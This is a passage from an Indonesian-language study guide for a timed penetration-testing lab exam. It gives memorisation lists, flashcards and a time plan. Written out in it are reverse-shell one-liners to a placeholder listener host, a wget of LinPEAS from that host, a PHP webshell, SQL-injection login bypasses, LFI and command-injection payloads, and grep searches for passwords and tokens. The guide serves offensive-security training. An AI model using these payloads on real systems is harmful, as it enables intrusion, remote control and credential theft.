grep -RniE 'flag\{|FLAG\{|CTF\{|THM\{|HTB\{' /home /root /opt /var/www 2>/dev/null
```

### 10. Decision Shortcut

```text
Login admin ada?
-> uji SQLi

Parameter page/file ada?
-> uji LFI

Fitur ping/monitor/check status ada?
-> uji command injection

Upload file ada?
-> uji web shell

Sudah dapat shell?
-> sudo -l -> SUID -> getcap -> cron
```

Shortcut tambahan yang perlu diingat:

```text
SQLi berhasil login?
-> cari panel upload / profile / admin feature

LFI berhasil baca passwd?
-> coba access.log poisoning

Command injection berhasil id?
-> langsung cek user flag dan sudo -l

Web shell berhasil?
-> langsung id -> getcap -> sudo -l -> SUID
```


---

# 28. Command Wajib Hafal

## Level 1 — Harus spontan

```bash
ip a
nmap -sn 192.168.56.0/24
nmap -sC -sV -p- "$TARGET"
dirsearch -u "$WEB/"
nc -lvnp 4444
bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'
python3 -c 'import pty;pty.spawn("/bin/bash")'
id; sudo -l
uname -a; cat /etc/os-release
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab; ls -la /etc/cron.d/
ss -tlnp
id; hostname
find / -type f -iname "flag*" 2>/dev/null
```

## Level 2 — Hafal setelah Level 1

```bash
find / -perm -2000 -type f 2>/dev/null
find / -writable -type f 2>/dev/null | grep -v proc
grep -RniE 'password|passwd|secret|token' /var/www /opt /home 2>/dev/null
wget http://<LHOST>:8089/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | tee /tmp/linpeas-output.txt
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> 4444 >/tmp/f
```

## Level 3 — Cukup tahu pola

```text
- msfvenom variasi payload
- exploit GTFOBins per binary
- kernel exploit spesifik
- payload SSTI spesifik engine
- variasi bypass upload
```

---

# 29. Flashcards

## Q1 — Scan seluruh port?

```bash
nmap -p- --min-rate 5000 -T4 "$TARGET"
```

## Q2 — Scan detail service?

```bash
nmap -sC -sV -p<PORTS> "$TARGET"
```

## Q3 — Directory enumeration?

```bash
dirsearch -u "$WEB/"
```

## Q4 — SQLi login dasar?

```text
' OR '1'='1'-- -
admin'-- -
```

## Q5 — SQLMap urutan?

```text
detect → current-db → dbs → tables → dump
```

## Q6 — LFI dasar?

```text
?page=../../../../etc/passwd
```

## Q7 — SSTI dasar?

```text
{{7*7}}
```

## Q8 — Command injection dasar?

```text
; id
```

## Q9 — PHP webshell?

```php
<?php system($_GET['cmd']); ?>
```

## Q10 — Listener?

```bash
nc -lvnp 4444
```

## Q11 — Bash reverse shell?

```bash
bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'
```

## Q12 — Stabilize shell?

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

## Q13 — Cek sudo?

```bash
sudo -l
```

## Q14 — Cari SUID?

```bash
find / -perm -4000 -type f 2>/dev/null
```

## Q15 — Cari capabilities?

```bash
getcap -r / 2>/dev/null
```

## Q16 — Cek cron?

```bash
cat /etc/crontab
ls -la /etc/cron.d/
```

## Q17 — Cari service internal?

```bash
ss -tlnp
```

## Q18 — Verifikasi root?

```bash
id
```

## Q19 — Cari flag?

```bash
find / -type f -iname "flag*" 2>/dev/null
```

## Q20 — Bukti submission?

```bash
id
hostname
cat <PATH_FLAG>
```

---

# 30. Strategi Waktu Ujian 120 Menit

## Menit 0–15 — Discover dan Scan

```text
- temukan IP;
- scan seluruh port;
- scan versi service;
- catat semua port.
```

## Menit 15–40 — Service/Web Enumeration

```text
- cek setiap web port;
- robots.txt;
- directory enumeration;
- tangkap parameter dan request.
```

## Menit 40–65 — Foothold

```text
- prioritaskan login, upload, parameter id/page, diagnostic;
- konfirmasi dengan payload sederhana;
- cari RCE;
- buat reverse shell.
```

## Menit 65–90 — Local Enumeration

```text
- sudo;
- SUID;
- capabilities;
- cron;
- credential;
- internal service;
- LinPEAS.
```

## Menit 90–110 — Root

```text
- gunakan jalur termudah;
- jangan mulai dari kernel;
- verifikasi uid/euid 0.
```

## Menit 110–120 — Flag dan Proof

```text
- cari flag;
- cat flag;
- id;
- hostname;
- screenshot;
- rapikan catatan.
```

---

# 31. Ringkasan Satu Halaman

```text
DISCOVER
  ip a
  nmap -sn subnet

SCAN
  nmap -p- --min-rate 5000
  nmap -sC -sV -pPORTS

WEB
  robots.txt
  dirsearch / feroxbuster

FOOTHOLD
  SQLi   : ' OR '1'='1'-- -
  LFI    : ../../../../etc/passwd
  SSTI   : {{7*7}}
  CMDi   : ; id
  Upload : PHP webshell

SQLMAP
  detect → current-db → dbs → tables → dump

SHELL
  nc -lvnp 4444
  bash reverse shell

TTY
  python pty

ENUM
  id
  sudo -l
  uname
  SUID
  SGID
  getcap
  cron
  writable
  credential
  ss -tlnp
  linpeas

PRIVESC
  credential
  sudo
  SUID
  capability
  cron
  weak permission
  kernel terakhir

ROOT
  id
  whoami
  hostname

FLAG
  /root
  /home
  /var/www
  /opt
  find flag/proof/root/user

PROOF
  id
  hostname
  cat flag
```

---
